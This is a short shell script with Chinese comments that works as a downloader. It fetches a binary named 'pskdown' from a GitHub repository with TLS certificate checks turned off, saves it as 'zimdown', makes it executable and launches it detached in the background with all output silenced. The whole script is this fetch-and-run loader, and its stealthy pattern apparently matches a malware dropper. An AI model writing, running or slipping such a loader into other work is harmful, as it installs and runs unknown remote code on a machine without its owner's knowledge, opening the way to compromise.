#!/bin/sh

# ==============================
# 配置区域
# ==============================

# 下载地址
url="https://github.com/gitcmaster/dwon/raw/refs/heads/main/pskdown"

# 落地文件
file="zimdown"

# 启动参数
args="-checkagent=false -maintain=true"

# 放在配置区域之后、下载之前
case "$file" in
    */*) ;;                # 已带目录，按路径执行即可
    *) file="./$file" ;;   # 纯文件名时补 ./，避免走 PATH 查找
esac

# ==============================
# 下载
# ==============================

mkdir -p "$(dirname "$file")"


tmp="${file}.tmp"

if command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -O "$tmp" "$url"
elif command -v curl >/dev/null 2>&1; then
    curl -fsSk -o "$tmp" "$url"
else
    exit 1
fi

[ -s "$tmp" ] || {
    rm -f "$tmp"
    exit 1
}

mv -f "$tmp" "$file"
# 添加执行权限
chmod 755 "$file"


# ==============================
# 后台启动
# ==============================

if command -v setsid >/dev/null 2>&1; then
    setsid "$file" $args >/dev/null 2>&1 &
elif command -v nohup >/dev/null 2>&1; then
    nohup "$file" $args >/dev/null 2>&1 &
else
    "$file" $args >/dev/null 2>&1 &
fi